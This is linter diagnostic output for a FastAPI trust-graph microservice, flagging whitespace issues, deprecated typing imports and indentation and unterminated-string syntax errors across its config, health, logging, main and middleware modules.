16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\trust-graph-engine\app\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\trust-graph-engine\app\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
27 |     JWT_ALGORITHM: str = "HS256"
28 |     JWT_EXPIRY_HOURS: int = 24
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\trust-graph-engine\app\config.py:27:1
   |
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   | ^^^^
28 |     JWT_EXPIRY_HOURS: int = 24
29 | # Rate Limiting
   |

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:32:1
   |
30 |     RATE_LIMIT_PER_MINUTE: int = 250
31 |     RATE_LIMIT_BURST: int = 500
32 |     
   | ^^^^
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:35:1
   |
33 |     # CORS
34 |     CORS_ORIGINS: List[str] = ['*']
35 |     
   | ^^^^
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\trust-graph-engine\app\config.py:37:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
   | ^
38 |     DB_TIMEOUT: int = 30
   |

invalid-syntax: Unexpected indentation
  --> emergent-microservices\trust-graph-engine\app\config.py:38:1
   |
36 |     # Database
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
   | ^^^^
39 |     
40 |     # Observability
   |

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\trust-graph-engine\app\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> emergent-microservices\trust-graph-engine\app\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\trust-graph-engine\app\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\trust-graph-engine\app\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\trust-graph-engine\app\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\trust-graph-engine\app\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\trust-graph-engine\app\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\trust-graph-engine\app\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\trust-graph-engine\app\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\trust-graph-engine\app\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> emergent-microservices\trust-graph-engine\app\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> emergent-microservices\trust-graph-engine\app\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\trust-graph-engine\app\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\trust-graph-engine\app\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("distributed_reputation_&_trust_graph_engine")
   | ^
   |

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting Distributed Reputation & Trust Graph Engine service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\trust-graph-engine\app\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\trust-graph-engine\app\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\trust-graph-engine\app\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down Distributed Reputation & Trust Graph Engine service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down Distributed Reputation & Trust Graph Engine service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\trust-graph-engine\app\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="Distributed Reputation & Trust Graph Engine",
86 |     description="Build:
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\trust-graph-engine\app\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="Distributed Reputation & Trust Graph Engine",
86 |     description="Build:
   |                 ^^^^^^^
87 | Verifiable identity nodes
88 | Weighted trust edges
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:87:1
   |
85 |     title="Distributed Reputation & Trust Graph Engine",
86 |     description="Build:
87 | Verifiable identity nodes
   | ^^^^^^^^^^
88 | Weighted trust edges
89 | Sybil resistance scoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:87:12
   |
85 |     title="Distributed Reputation & Trust Graph Engine",
86 |     description="Build:
87 | Verifiable identity nodes
   |            ^^^^^^^^
88 | Weighted trust edges
89 | Sybil resistance scoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:87:21
   |
85 |     title="Distributed Reputation & Trust Graph Engine",
86 |     description="Build:
87 | Verifiable identity nodes
   |                     ^^^^^
88 | Weighted trust edges
89 | Sybil resistance scoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:88:1
   |
86 |     description="Build:
87 | Verifiable identity nodes
88 | Weighted trust edges
   | ^^^^^^^^
89 | Sybil resistance scoring
90 | On-chain optional anchoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:88:10
   |
86 |     description="Build:
87 | Verifiable identity nodes
88 | Weighted trust edges
   |          ^^^^^
89 | Sybil resistance scoring
90 | On-chain optional anchoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:88:16
   |
86 |     description="Build:
87 | Verifiable identity nodes
88 | Weighted trust edges
   |                ^^^^^
89 | Sybil resistance scoring
90 | On-chain optional anchoring
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:89:1
   |
87 | Verifiable identity nodes
88 | Weighted trust edges
89 | Sybil resistance scoring
   | ^^^^^
90 | On-chain optional anchoring
91 | Real-time trust API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:89:7
   |
87 | Verifiable identity nodes
88 | Weighted trust edges
89 | Sybil resistance scoring
   |       ^^^^^^^^^^
90 | On-chain optional anchoring
91 | Real-time trust API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:89:18
   |
87 | Verifiable identity nodes
88 | Weighted trust edges
89 | Sybil resistance scoring
   |                  ^^^^^^^
90 | On-chain optional anchoring
91 | Real-time trust API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:90:1
   |
88 | Weighted trust edges
89 | Sybil resistance scoring
90 | On-chain optional anchoring
   | ^^
91 | Real-time trust API
92 | Use cases:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:90:10
   |
88 | Weighted trust edges
89 | Sybil resistance scoring
90 | On-chain optional anchoring
   |          ^^^^^^^^
91 | Real-time trust API
92 | Use cases:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:90:19
   |
88 | Weighted trust edges
89 | Sybil resistance scoring
90 | On-chain optional anchoring
   |                   ^^^^^^^^^
91 | Real-time trust API
92 | Use cases:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:91:1
   |
89 | Sybil resistance scoring
90 | On-chain optional anchoring
91 | Real-time trust API
   | ^^^^
92 | Use cases:
93 | Anti-bot verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:91:11
   |
89 | Sybil resistance scoring
90 | On-chain optional anchoring
91 | Real-time trust API
   |           ^^^^^
92 | Use cases:
93 | Anti-bot verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:91:17
   |
89 | Sybil resistance scoring
90 | On-chain optional anchoring
91 | Real-time trust API
   |                 ^^^
92 | Use cases:
93 | Anti-bot verification
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:92:1
   |
90 | On-chain optional anchoring
91 | Real-time trust API
92 | Use cases:
   | ^^^
93 | Anti-bot verification
94 | Secure marketplaces
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:92:5
   |
90 | On-chain optional anchoring
91 | Real-time trust API
92 | Use cases:
   |     ^^^^^
93 | Anti-bot verification
94 | Secure marketplaces
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\trust-graph-engine\app\main.py:92:10
   |
90 | On-chain optional anchoring
91 | Real-time trust API
92 | Use cases:
   |          ^
93 | Anti-bot verification
94 | Secure marketplaces
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\trust-graph-engine\app\main.py:93:1
   |
91 | Real-time trust API
92 | Use cases:
93 | Anti-bot verification
   | ^^^^^^^^
94 | Secure marketplaces
95 | Intelligence vetting networks
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:93:10
   |
91 | Real-time trust API
92 | Use cases:
93 | Anti-bot verification
   |          ^^^^^^^^^^^^
94 | Secure marketplaces
95 | Intelligence vetting networks
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:94:1
   |
92 | Use cases:
93 | Anti-bot verification
94 | Secure marketplaces
   | ^^^^^^
95 | Intelligence vetting networks
96 | High-signal communication channels
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:94:8
   |
92 | Use cases:
93 | Anti-bot verification
94 | Secure marketplaces
   |        ^^^^^^^^^^^^
95 | Intelligence vetting networks
96 | High-signal communication channels
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:95:1
   |
93 | Anti-bot verification
94 | Secure marketplaces
95 | Intelligence vetting networks
   | ^^^^^^^^^^^^
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:95:14
   |
93 | Anti-bot verification
94 | Secure marketplaces
95 | Intelligence vetting networks
   |              ^^^^^^^
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:95:22
   |
93 | Anti-bot verification
94 | Secure marketplaces
95 | Intelligence vetting networks
   |                      ^^^^^^^^
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:96:1
   |
94 | Secure marketplaces
95 | Intelligence vetting networks
96 | High-signal communication channels
   | ^^^^
97 | If done correctly, this becomes infrastructure.",
98 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:96:13
   |
94 | Secure marketplaces
95 | Intelligence vetting networks
96 | High-signal communication channels
   |             ^^^^^^^^^^^^^
97 | If done correctly, this becomes infrastructure.",
98 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:96:27
   |
94 | Secure marketplaces
95 | Intelligence vetting networks
96 | High-signal communication channels
   |                           ^^^^^^^^
97 | If done correctly, this becomes infrastructure.",
98 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:97:1
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   | ^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:97:4
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |    ^^^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:97:9
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |         ^^^^^^^^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\trust-graph-engine\app\main.py:97:20
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |                    ^^^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:97:25
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |                         ^^^^^^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\trust-graph-engine\app\main.py:97:33
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |                                 ^^^^^^^^^^^^^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\trust-graph-engine\app\main.py:97:33
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |                                 ^^^^^^^^^^^^^^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\trust-graph-engine\app\main.py:97:48
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |                                                ^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found string
  --> emergent-microservices\trust-graph-engine\app\main.py:97:48
   |
95 | Intelligence vetting networks
96 | High-signal communication channels
97 | If done correctly, this becomes infrastructure.",
   |                                                ^^
98 |     version="1.0.0",
99 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
   --> emergent-microservices\trust-graph-engine\app\main.py:98:5
    |
 96 | High-signal communication channels
 97 | If done correctly, this becomes infrastructure.",
 98 |     version="1.0.0",
    |     ^^^^^^^
 99 |     lifespan=lifespan,
100 | docs_url="/api/v1/docs",
    |

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\middleware.py:97:1
   |
